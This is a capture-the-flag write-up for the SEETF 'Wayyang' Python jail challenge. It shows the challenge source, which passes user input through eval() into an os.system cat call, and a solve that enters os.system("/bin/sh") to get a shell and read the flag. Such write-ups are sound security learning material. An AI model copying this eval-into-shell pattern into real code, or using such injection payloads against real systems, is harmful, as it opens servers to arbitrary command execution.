## Wayyang
![wayyang](images/wayyang.png)

### Description
>Author: Fawl\
>Infintesky as a service <3\
>nc fun.chall.seetf.sg 50008\
>MD5: b2fda586e0324449e9337fdad8a62757



### Gain Shell
Python Jail challenge, the source code was given and it look like this
```py
#!/usr/local/bin/python
import os

FLAG_FILE = "FLAG"

def get_input() -> int:
    print('''                 ,#####,
                 #_   _#
                 |a` `a|
                 |  u  |            ________________________
                 \  =  /           |        WAYYANG         |
                 |\___/|           <     TERMINAL  v1.0     |
        ___ ____/:     :\____ ___  |________________________|
      .'   `.-===-\   /-===-.`   '.
     /      .-"""""-.-"""""-.      \
    /'             =:=             '\
  .'  ' .:    o   -=:=-   o    :. '  `.
  (.'   /'. '-.....-'-.....-' .'\   '.)
  /' ._/   ".     --:--     ."   \_. '\
 |  .'|      ".  ---:---  ."      |'.  |
 |  : |       |  ---:---  |       | :  |
  \ : |       |_____._____|       | : /
  /   (       |----|------|       )   \
 /... .|      |    |      |      |. ...\
|::::/'' jgs /     |       \     ''\::::|
'""""       /'    .L_      `\       """"'
           /'-.,__/` `\__..-'\
          ;      /     \      ;
          :     /       \     |
          |    /         \.   |
          |`../           |  ,/
          ( _ )           |  _)
          |   |           |   |
          |___|           \___|
          :===|            |==|
           \  /            |__|
           /\/\           /"""`8.__
           |oo|           \__.//___)
           |==|
           \__/''')
    print("What would you like to do today?")
    print("1. Weather")
    print("2. Time")
    print("3. Tiktok of the day")
    print("4. Read straits times")
    print("5. Get flag")
    print("6. Exit")

    choice = int(input(">> "))

    return choice


if __name__ == '__main__':
    choice = get_input()

    if choice == 1:
        print("CLEAR SKIES FOR HANDSOME MEN")
    elif choice == 2:
        print("IT'S ALWAYS SEXY TIME")
    elif choice == 3:
        print("https://www.tiktok.com/@benawad/video/7039054021797252399")
    elif choice == 4:
        filename = input("which news article you want babe :)   ")
        not_allowed = [char for char in FLAG_FILE]

        for char in filename:
            if char in not_allowed:
                print("NICE TRY. WAYYANG SEE YOU!!!!!")
                os.system(f"cat news.txt")
                exit()

        try:
            os.system(f"cat {eval(filename)}")
        except:
            pass
    elif choice == 5:
        print("NOT READY YET. MAYBE AFTER CTF????")
```

The bug is on **input()** at choice 4, because the program already **import os**, then just simply input **os.system("/bin/sh")** to get shell
```bash
$ nc fun.chall.seetf.sg 50008
$ What would you like to do today?
$ 1. Weather
$ 2. Time
$ 3. Tiktok of the day
$ 4. Read straits times
$ 5. Get flag
$ 6. Exit
$ >> 4
$ which news article you want babe :)   os.system("/bin/sh")
$ ls
$ FLAG
$ bin
$ news
$ run.sh
$ wayyang.py
$ cat FLAG
$ SEE{wayyang_as_a_service_621331e420c46e29cfde50f66ad184cc}
````